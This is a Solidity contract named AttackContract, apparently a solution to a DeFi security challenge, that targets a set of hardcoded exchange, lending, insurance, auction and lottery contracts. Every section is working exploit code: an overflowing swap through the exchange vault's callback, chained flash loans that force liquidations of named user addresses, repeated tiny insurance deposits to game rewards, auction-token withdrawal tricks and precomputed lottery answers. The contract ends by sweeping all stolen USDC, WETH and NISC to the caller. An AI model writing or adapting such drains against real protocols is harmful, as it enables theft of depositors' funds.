// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

import "./interfaces/IAuctionManager.sol";
import "./interfaces/IAuctionToken.sol";
import "./interfaces/IAuctionVault.sol";
import "./interfaces/ICommunityInsurance.sol";
import "./interfaces/IExchange.sol";
import "./interfaces/IExchangeVault.sol";
import "./interfaces/IFlashLoaner.sol";
import "./interfaces/IIdleMarket.sol";
import "./interfaces/IInvestmentVault.sol";
import "./interfaces/IInvestmentVaultFactory.sol";
import "./interfaces/ILendingFactory.sol";
import "./interfaces/ILendingManager.sol";
import "./interfaces/ILendingPool.sol";
import "./interfaces/ILottery.sol";
import "./interfaces/ILotteryCommon.sol";
import "./interfaces/ILotteryExtension.sol";
import "./interfaces/ILotteryStorage.sol";
import "./interfaces/IPool.sol";
import "./interfaces/IPriceOracle.sol";
import "./interfaces/IRewardDistributor.sol";
import "./interfaces/IStrategy.sol";
import "./interfaces/IWeth.sol";

contract AttackContract {
    IERC20 public constant usdc = IERC20(0xBf1C7F6f838DeF75F1c47e9b6D3885937F899B7C);
    IERC20 public constant nisc = IERC20(0x20e4c056400C6c5292aBe187F832E63B257e6f23);
    IWeth public constant weth = IWeth(0x13d78a4653e4E18886FBE116FbB9065f1B55Cd1d);
    ILottery public constant lottery = ILottery(0x6D03B9e06ED6B7bCF5bf1CF59E63B6eCA45c103d);
    ILotteryExtension public constant lotteryExtension = ILotteryExtension(0x6D03B9e06ED6B7bCF5bf1CF59E63B6eCA45c103d);
    IAuctionVault public constant auctionVault = IAuctionVault(0x9f4a3Ba629EF680c211871c712053A65aEe463B0);
    IAuctionManager public constant auctionManager = IAuctionManager(0x228F0e62b49d2b395Ee004E3ff06841B21AA0B54);
    IStrategy public constant lendingPoolStrategy = IStrategy(0xC5cBC10e8C7424e38D45341bD31342838334dA55);
    IExchangeVault public constant exchangeVault = IExchangeVault(0x776B51e76150de6D50B06fD0Bd045de0a13D68C7);
    // Product pools: [0] = USDC/WETH pool, [1] = USDC/NISC pool
    IPool[] public productPools = [IPool(0x536BF770397157efF236647d7299696B90Bc95f1), IPool(0x6cAC85Dc0D547225351097Fb9eEb33D65978bb73)];
    IPriceOracle public constant priceOracle = IPriceOracle(0x9231ffAC09999D682dD2d837a5ac9458045Ba1b8);
    ILendingFactory public constant lendingFactory = ILendingFactory(0xdC5b6f8971AD22dC9d68ed7fB18fE2DB4eC66791);
    // Lending managers: [0] = Lending Trio 1 manager, [1] = Lending Trio 2 manager
    ILendingManager[] public lendingManagers = [ILendingManager(0x66bf9ECb0B63dC4815Ab1D2844bE0E06aB506D4f), ILendingManager(0x5FdA5021562A2Bdfa68688d1DFAEEb2203d8d045)];
    ILendingPool[] public lendingPoolsA = [ILendingPool(0xfAC23E673e77f76c8B90c018c33e061aE8F8CBD9), ILendingPool(0xFa6c040D3e2D5fEB86Eda9e22736BbC6eA81a16b)];
    ILendingPool[] public lendingPoolsB = [ILendingPool(0xb022AE7701DF829F2FF14B51a6DFC8c9A95c6C61), ILendingPool(0x537B309Fec55AD15Ef2dFae1f6eF3AEBD80d0d9c)];
    IFlashLoaner public constant flashLoaner = IFlashLoaner(0x5861a917A5f78857868D88Bd93A18A3Df8E9baC7);
    IInvestmentVaultFactory public constant investmentFactory = IInvestmentVaultFactory(0xd526270308228fDc16079Bd28eB1aBcaDd278fbD);
    IIdleMarket public constant usdcIdleMarket = IIdleMarket(0xB926534D703B249B586A818B23710938D40a1746);
    // Investment vaults: [0] = USDC Strategy 1 vault, [1] = USDC Strategy 2 vault
    IInvestmentVault[] public investmentVaults = [IInvestmentVault(0x99828D8000e5D8186624263f1b4267aFD4E27669), IInvestmentVault(0xe7A23A3Bf899f67e0B40809C8f449A7882f1a26E)];
    ICommunityInsurance public constant communityInsurance = ICommunityInsurance(0x83f3997529982fB89C4c983D82d8d0eEAb2Bb034);
    IRewardDistributor public constant rewardDistributor = IRewardDistributor(0x73a8004bCD026481e27b5B7D0d48edE428891995);
    
    /// STORAGE
    
    uint256 constant PCT_DIV = 10_000;
    uint256 constant FEE = 3;
    uint256 constant FEE_FLASH = 1000;
    uint8 stage;
          
    uint256 fee0;
    uint256 fee1;
    
    address lendingUser0 = 0x11c8738979A536F9F9AEE32d1724D62ac1adb7De;                                                                                                                             
	address lendingUser1 = 0xd906fa937Caa022Fa08B58316c59A5262c048d2C;                                                                                                                             
	address lendingUser2 = 0xfa614DEB6D1b897099C15B512c5A62C6a6611bdC;
    address player = address(this);
 
    constructor() payable {}
    
    /// LOGIC
    
    function dustoff(address to) public {
    	usdc.transfer(to, usdc.balanceOf(address(this)));
        weth.transfer(to, weth.balanceOf(address(this)));
        nisc.transfer(to, nisc.balanceOf(address(this)));
    }
    
    function rektExchange(IExchangeVault exchangeVault, IPool pool) public {
        bytes memory payload = abi.encode(pool);
        exchangeVault.unlock(abi.encodeWithSelector(this.onExchangeCallback.selector, payload));
    }

    function onExchangeCallback(bytes memory data) external {
        (IPool pool) = abi.decode(data, (IPool));    
        IExchangeVault exchangeVault = IExchangeVault(msg.sender);

        uint256 niscIn = 2 ** 148;
        uint256 magic = 2 ** 255;
        exchangeVault.sendTo(nisc, address(exchangeVault), magic);
        uint256 out = exchangeVault.swapInPool(pool, nisc, usdc, niscIn, 0);
        uint256 niscBal = nisc.balanceOf(address(exchangeVault));
        exchangeVault.sendTo(usdc, address(this), out);
        exchangeVault.sendTo(nisc, address(this), niscBal);

        uint256 diff = magic - niscIn * (PCT_DIV + FEE) / PCT_DIV - niscBal;
        exchangeVault.sendTo(nisc, address(exchangeVault), diff);
    }
    
    function redeemShares(address[] memory pools) public {
        for(uint256 i=0; i<pools.length; ++i) {
            if(pools[i] == address(0)) continue;
            uint256 shares = ILendingPool(pools[i]).balanceOf(address(this));
            ILendingPool(pools[i]).redeem(shares, address(this), address(this));
        }
    }
    
    function onCallback(bytes memory data) external {
        (bool isA, uint256 idx, address target, uint256 amount, address token) =
            abi.decode(data, (bool, uint256, address, uint256, address));
            
        if(IERC20(token) == usdc && (fee0 == 0)) {
        	fee0 = amount * FEE_FLASH / PCT_DIV + 1;
        }
        if(IERC20(token) != usdc && (fee1 == 0)) {
        	fee1 = amount * FEE_FLASH / PCT_DIV + 1;
        }
         
        if (stage == 0) _stage0(isA, idx, target, amount);
        else if (stage == 1) _stage1(isA, idx, target, amount);
        else if (stage == 2) _stage2(isA, idx, target, amount);
        else if (stage == 3) _stage3(isA, idx, target, amount);
        else if (stage == 4) _stage4(isA, idx, target, amount);
        else if (stage == 5) _stage5(isA, idx, target, amount);
        else if (stage == 6) _stage6(isA, idx, target, amount);
        else if (stage == 7) _stage7(isA, idx, target, amount);
        else if (stage == 8) _stage8(isA, idx, target, amount);
        else if (stage == 9) _stage9(isA, idx, target, amount);
        else if (stage == 10) _stage10(isA, idx, target, amount);
        else if (stage == 11) _stage11(isA, idx, target, amount);
        else if (stage == 12) _stage12(isA, idx, target, amount);
        else if (stage == 13) _stage13(isA, idx, target, amount);
        else if (stage == 14) _stage14(isA, idx, target, amount);
        else if (stage == 15) _stage15(isA, idx, target, amount);
    }

    function _trio(uint256 idx, bool isA)
        internal
        view
        returns (
            ILendingManager lm,
            ILendingPool debtPool,
            ILendingPool collPool,
            IERC20 debtToken,
            IERC20 collToken,
            ILendingManager.AssetType assetType
        )
    {
        (ILendingManager _lm, ILendingPool lpA, ILendingPool lpB) = lendingFactory.getTrio(idx);
        if (isA) {
            debtPool = lpA;
            collPool = lpB;
            assetType = ILendingManager.AssetType(0);
        } else {
            debtPool = lpB;
            collPool = lpA;
            assetType = ILendingManager.AssetType(1);
        }

		lm = _lm;
        debtToken = IERC20(debtPool.asset());
        collToken = IERC20(collPool.asset());
    }

    function _repay(IFlashLoaner flash, IERC20 token, uint256 amount, uint256 fee) internal {
		token.transfer(address(flash), amount + fee);
        if(token == usdc) {
        	fee0 -= (fee);
        } else {
        	fee1 -= (fee);
        }
    }

    function _stage0(bool isA, uint256 idx, address target, uint256 amount) internal {
        stage++;
        (, ILendingPool debtPool,, IERC20 debtToken,,) = _trio(idx, isA);
        uint256 loan = debtToken.balanceOf(address(debtPool)) - 1;
        flashLoaner.flashloan(debtToken, loan, address(this), abi.encode(isA, idx, target, loan, address(debtToken)));
        uint256 shares = debtPool.previewWithdraw(amount);
        debtPool.redeem(shares, address(this), address(this));
        _repay(flashLoaner, debtToken, amount, 0);
        fee0 = 0;
    }

    function _stage1(bool isA, uint256 idx, address target, uint256 amount) internal {
        stage++;
        (ILendingManager lm, ILendingPool debtPool,, IERC20 debtToken,, ILendingManager.AssetType assetType) = _trio(idx, isA);
        flashLoaner.flashloan(debtToken, 1, address(this), abi.encode(isA, idx, target, 1, address(debtToken)));
        debtToken.approve(address(lm), type(uint256).max);
        lm.liquidate(assetType, target);
        uint256 loan = debtToken.balanceOf(address(debtPool)) - 1;
        flashLoaner.flashloan(debtToken, loan, address(this), abi.encode(isA, idx, target, loan, address(debtToken)));
        _repay(flashLoaner, debtToken, amount, fee0);
    }

    function _stage2(bool, uint256 idx, address, uint256 amount) internal {
        stage++;
        (,,, IERC20 debtToken,,) = _trio(idx, true);
        _repay(flashLoaner, debtToken, amount, 1);
    }

    function _stage3(bool isA, uint256 idx, address target, uint256 amount) internal {
        stage++;
        (, ILendingPool debtPool,, IERC20 debtToken,,) = _trio(idx, isA);
        flashLoaner.flashloan(debtToken, 1, address(this), abi.encode(isA, idx, target, 1, address(debtToken)));
        debtToken.approve(address(debtPool), type(uint256).max);
        debtPool.mint(1e18, address(this));
        _repay(flashLoaner, debtToken, amount, amount * FEE_FLASH / PCT_DIV + 1);
    }

    function _stage4(bool, uint256 idx, address, uint256 amount) internal {
        stage++;
        (,,, IERC20 debtToken,,) = _trio(idx, true);
        _repay(flashLoaner, debtToken, amount, 1);
    }

    function _stage5(bool isA, uint256 idx, address target, uint256 amount) internal {
        stage++;
        (, ILendingPool debtPool,, IERC20 debtToken,,) = _trio(idx, isA);
        flashLoaner.flashloan(debtToken, 1, address(this), abi.encode(isA, idx, target, 1, address(debtToken)));
        debtToken.approve(address(debtPool), type(uint256).max);
        debtPool.mint(1e24, address(this));
        _repay(flashLoaner, debtToken, amount, fee1);
        fee1 = 0;
    }

    function _stage6(bool, uint256 idx, address, uint256 amount) internal {
        stage++;
        (,,, IERC20 debtToken, IERC20 collToken,) = _trio(idx, true);
        _repay(flashLoaner, collToken, amount, 1);
    }

    function _stage7(bool isA, uint256 idx, address target, uint256 amount) internal {
        stage++;
        (ILendingManager lm, ILendingPool debtPool, ILendingPool collPool, IERC20 debtToken, IERC20 collToken, ILendingManager.AssetType assetType) = _trio(idx, isA);
        flashLoaner.flashloan(collToken, 1, address(this), abi.encode(!isA, idx, target, 1, address(collToken)));
        debtToken.approve(address(lm), type(uint256).max);
        lm.liquidate(assetType, target);
        uint256 loan = debtToken.balanceOf(address(debtPool)) / 2;
        flashLoaner.flashloan(debtToken, loan, address(this), abi.encode(isA, idx, lendingUser1, loan, address(debtToken)));
        collToken.transfer(address(flashLoaner), amount + fee0);
        fee0 = 0;
        fee1 = 0;
    }

    function _stage8(bool, uint256 idx, address, uint256 amount) internal {
        stage++;
        (,,, IERC20 debtToken,,) = _trio(idx, true);
        _repay(flashLoaner, debtToken, amount, 1);
    }

    function _stage9(bool isA, uint256 idx, address target, uint256 amount) internal {
        stage++;
        (,,, IERC20 debtToken,,) = _trio(idx, isA);
        flashLoaner.flashloan(debtToken, amount - 1, address(this), abi.encode(isA, idx, target, amount - 1, address(debtToken)));
        _repay(flashLoaner, debtToken, amount, 0);
    }

    function _stage10(bool isA, uint256 idx, address target, uint256 amount) internal {
        stage++;
        (ILendingManager lm, ILendingPool debtPool, ILendingPool collPool, IERC20 debtToken, IERC20 collToken,) = _trio(idx, isA);
        flashLoaner.flashloan(debtToken, 1, address(this), abi.encode(isA, idx, target, 1, address(debtToken)));
        liquidateBadDebt(lm, target, ILendingManager.AssetType(0));
        liquidateBadDebt(lm, address(this), ILendingManager.AssetType(0));
        uint256 loan = collToken.balanceOf(address(collPool));
        flashLoaner.flashloan(collToken, loan, address(this), abi.encode(!isA, idx, lendingUser1, loan, address(collToken)));
        debtToken.approve(address(debtPool), type(uint256).max);
        debtPool.mint(1e24, address(this));
        _repay(flashLoaner, debtToken, amount, fee1);
    }

    function _stage11(bool, uint256 idx, address, uint256 amount) internal {
        stage++;
        (,,, IERC20 debtToken, IERC20 collToken,) = _trio(idx, true);
        _repay(flashLoaner, collToken, amount, 1);
    }

    function _stage12(bool isA, uint256 idx, address, uint256 amount) internal {
        stage++;
        (, ILendingPool debtPool,, IERC20 debtToken,,) = _trio(idx, isA);
        debtToken.approve(address(debtPool), type(uint256).max);
        debtPool.mint(1e18, address(this));
        _repay(flashLoaner, debtToken, amount, amount * FEE_FLASH / PCT_DIV + 1);
    }

    function _stage13(bool isA, uint256 idx, address target, uint256 amount) internal {
        stage++;
        (ILendingManager lm, ILendingPool debtPool, ILendingPool collPool, IERC20 debtToken, IERC20 collToken, ILendingManager.AssetType assetType) = _trio(idx, isA);
        flashLoaner.flashloan(collToken, 1, address(this), abi.encode(!isA, idx, target, 1, address(collToken)));
        liquidateBadDebt(lm, target, assetType);
        collToken.approve(address(debtPool), type(uint256).max);
        collPool.mint(1e18, address(this));
        uint256 loan = debtPool.getCash();
        flashLoaner.flashloan(debtToken, loan, address(this), abi.encode(isA, idx, lendingUser1, loan, address(debtToken)));
        collToken.transfer(address(flashLoaner), amount + fee0);
    }

    function _stage14(bool, uint256 idx, address, uint256 amount) internal {
        stage++;
        (,,, IERC20 debtToken,,) = _trio(idx, true);
        _repay(flashLoaner, debtToken, amount, 1);
    }

    function _stage15(bool isA, uint256 idx, address, uint256 amount) internal {
        stage++;
        (, ILendingPool debtPool,, IERC20 debtToken,,) = _trio(idx, isA);
        debtToken.approve(address(debtPool), type(uint256).max);
        debtPool.mint(1e24, address(this));
        _repay(flashLoaner, debtToken, amount, fee1);
    }
    
    function liquidateBadDebt(ILendingManager manager, address user, ILendingManager.AssetType assetType) public {
		bytes memory data = abi.encodeWithSignature(
    		"liquidateBadDebt(address,address,uint8)",
    		address(manager),
    		user,
    		uint8(assetType)
		);
        (bool success, bytes memory ret) = address(communityInsurance).call(data);
		if (!success) {
    		assembly {
        		revert(add(ret, 32), mload(ret))
    		}
		}
    }
    
    /// ATTACK
    
    function Attack() public {   
        /// EXCHANGE ATTACK
		rektExchange(exchangeVault, productPools[1]); 
        
        /// INVESTMENT ATTACK
        usdc.approve(address(investmentVaults[0]), type(uint256).max);
        usdc.approve(address(investmentVaults[1]), type(uint256).max);
        uint256 s1 = investmentVaults[0].deposit(5_000e6, player);
        uint256 s2 = investmentVaults[1].deposit(5_000e6, player);
        investmentVaults[0].redeem(s1, player, player);
        investmentVaults[1].redeem(s2, player, player);
        
        /// LENDING ATTACK      
        lendingPoolsA[0].approve(address(lendingManagers[0]), type(uint256).max);
        usdc.approve(address(lendingPoolsA[0]), type(uint256).max);
        s1 = lendingPoolsA[0].deposit(usdc.balanceOf(player), player);
        lendingManagers[0].lockCollateral(ILendingManager.AssetType(0), s1);
        
        lendingPoolsB[0].updateIndex();
        uint256 amount = weth.balanceOf(address(communityInsurance)) - lendingManagers[0].getDebt(ILendingManager.AssetType(1), lendingUser0) - 2;
        lendingManagers[0].borrow(ILendingManager.AssetType(1), amount);

        amount = usdc.balanceOf(address(lendingPoolsA[0])) / 2;
        flashLoaner.flashloan(
            usdc,
            amount, 
            address(this),
            abi.encode(true, 0, lendingUser2, amount, address(usdc))
        );
        
        liquidateBadDebt(lendingManagers[0], lendingUser0, ILendingManager.AssetType(1));
        liquidateBadDebt(lendingManagers[0], player, ILendingManager.AssetType(1));

        address[] memory pools = new address[](2);
        pools[0] = address(lendingPoolsA[0]);
        pools[1] = address(lendingPoolsB[0]);
        redeemShares(pools);

        amount = weth.balanceOf(address(lendingPoolsB[0])) - 1;
        flashLoaner.flashloan(
            IERC20(address(weth)),
            amount, 
            address(this),
            abi.encode(false, 0, address(0), amount, address(weth))
        );

        redeemShares(pools);

        lendingPoolsB[1].approve(address(lendingManagers[1]), type(uint256).max);
        nisc.approve(address(lendingPoolsB[1]), type(uint256).max);
        s1 = lendingPoolsB[1].deposit(134_000e18, player);
        lendingManagers[1].lockCollateral(ILendingManager.AssetType(1), s1);
        
        amount = usdc.balanceOf(address(communityInsurance)) - lendingManagers[1].getDebt(ILendingManager.AssetType(0), lendingUser1) - 1;
        lendingManagers[1].borrow(ILendingManager.AssetType(0), amount);
            
        amount = usdc.balanceOf(address(lendingPoolsA[1])) + lendingPoolsA[0].getCash() - 1;
        flashLoaner.flashloan(
            usdc,
            amount, 
            address(this),
            abi.encode(false, 1, lendingUser0, amount, address(usdc))
        );
        
        pools[0] = address(lendingPoolsA[1]);
        pools[1] = address(lendingPoolsB[1]);
        redeemShares(pools);

        nisc.approve(address(lendingPoolsB[1]), type(uint256).max);
        lendingPoolsB[1].deposit(130_000e18, address(this));

        lendingPoolsA[1].approve(address(lendingManagers[1]), type(uint256).max);
        usdc.approve(address(lendingPoolsA[1]), type(uint256).max);
        s1 = lendingPoolsA[1].deposit(60_000e6, player);
        lendingManagers[1].lockCollateral(ILendingManager.AssetType(0), s1);
        lendingManagers[1].borrow(ILendingManager.AssetType(1), 160_000e18 - 1);
        
        amount = lendingPoolsA[1].getCash() + lendingPoolsA[0].getCash() - 1;
        flashLoaner.flashloan(
            usdc,
            amount, 
            address(this),
            abi.encode(false, 1, player, amount, address(usdc))
        );
     
        pools[0] = address(lendingPoolsA[1]);
        pools[1] = address(lendingPoolsB[1]);
        redeemShares(pools);
        
        /// INSURANCE ATTACK
        uint256[] memory deposits = new uint256[](3);
        deposits[0] = 1; 
        deposits[1] = 1;
        deposits[2] = 1;

        usdc.approve(address(communityInsurance), type(uint256).max);
        weth.approve(address(communityInsurance), type(uint256).max);
        nisc.approve(address(communityInsurance), type(uint256).max);
        for(uint256 i=0; i<22; ++i) {
            communityInsurance.deposit{gas: 70000}(deposits);
        }
        rewardDistributor.claimReward(); 
        
        /// AUCTION ATTACK
        nisc.approve(address(auctionManager), type(uint256).max);
        usdc.approve(address(auctionManager), type(uint256).max);

        auctionManager.depositERC20(nisc, 200_000e18);
        IERC20 aNisc = auctionManager.auctionTokens(nisc);
        IERC20 aUsdc = auctionManager.auctionTokens(usdc);

        uint256 id = auctionManager.auctionCount();
        auctionManager.createAuction(IERC721(address(nisc)), 266_000e18, 0, 0, nisc, 86400);
        auctionManager.withdrawERC20(nisc, aNisc.balanceOf(player) - 10);
        auctionManager.bid(id, 1);

        auctionManager.depositERC20(usdc, 200_000e6);
        id = auctionManager.createAuction(IERC721(address(usdc)), 200_000e6, 0, 0, nisc, 86400);
        auctionManager.bid(0, 200_000e6);
        auctionManager.withdrawERC20(usdc, aUsdc.balanceOf(player) - 10);
        auctionManager.bid(id, 1);

        /// LOTTERY ATTACK
        auctionManager.registerAuctionToken(IERC20(address(lottery)), "REKT", "REKT");
        IERC20 aLot = auctionManager.auctionTokens(IERC20(address(lottery)));
        usdc.approve(address(lottery), type(uint256).max);
        lottery.purchaseTicket("HUH?");
        lottery.approve(address(auctionManager), 3);
        auctionManager.depositERC20(IERC20(address(lottery)), 3);
        auctionManager.withdrawERC20(IERC20(address(lottery)), 1);
        auctionManager.withdrawERC20(IERC20(address(lottery)), 2);

        ILotteryExtension(address(lottery)).solveMulmod93740(0, 22944716803525420696533866530183787158952213232330281032959477737241389970872);
        ILotteryExtension(address(lottery)).solveMulmod90174(1, 40289530849315046632803046237695507888814621779004955301521665942329666711931);
        ILotteryExtension(address(lottery)).solveMulmod89443(2, 25763313276182728748094861671409962815748632632615992537054984139247576418966);
        
		dustoff(msg.sender);
    }
    
    receive() external payable {}
}